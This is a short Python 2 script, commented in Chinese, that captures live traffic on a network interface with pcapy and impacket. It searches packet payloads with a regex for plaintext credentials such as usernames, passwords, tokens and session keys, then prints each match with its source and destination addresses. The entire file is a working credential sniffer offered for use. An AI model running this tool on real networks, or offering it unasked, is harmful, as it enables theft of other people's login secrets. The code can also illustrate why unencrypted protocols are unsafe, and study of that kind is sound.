#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
通常在未加密的传输协议中，我们可以直接从数据包中匹配出帐号密码。
"""

import sys
import re
import getopt
import pcapy
from impacket.ImpactDecoder import EthDecoder, IPDecoder, TCPDecoder

dev = "eth0"
filter = "tcp"

# 每层上的解码器
eth_dec = EthDecoder()
ip_dec = IPDecoder()
tcp_dec = TCPDecoder()

# 符合username和passwords的正则
pattern = re.compile(r"""(?P<found>(USER|USERNAME|PASS|\
                    PASSWORD|LOGIN|BENUTZER|PASSWORT|AUTH|\
                    ACCESS|ACCESS_?KEY|SESSION|SESSION_?KEY|\
                    TOKEN)[=:\s].+)\b""", re.MULTILINE|re.IGNORECASE)


# 每个数据包都要调用此函数，用于解码和查找pattern
def handle_packet(hdr, data):
    eth_pkt = eth_dec.decode(data)
    ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())
    tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())
    playload = ip_pkt.get_data_as_string()

    match = re.search(pattern, playload)
    if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and \
        not tcp_pkt.get_FIN() and match and match.groupdict()['found'] != None:
            print "%s:%d -> %s:%d" % (ip_pkt.get_ip_src(),
                                    tcp_pkt.get_th_sport(),
                                    ip_pkt.get_ip_dst(),
                                    tcp_pkt.get_th_dport())
            print "\t%s\n" % (match.groupdict()['found'])


def usage():
    print sys.argv[0] + " -i <dev> -f <pacp_filter>"
    sys.exit(1)


try:
    cmd_opts = "f:i:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-f":
        filter = opt[1]
    elif opt[0] == "-i":
        dev = opt[1]
    else:
        usage()


pcap = pcapy.open_live(dev, 1500, 0, 100)
pcap.setfilter(filter)
print "Sniffing passwords on " + str(dev)
pcap.loop(0, handle_packet)
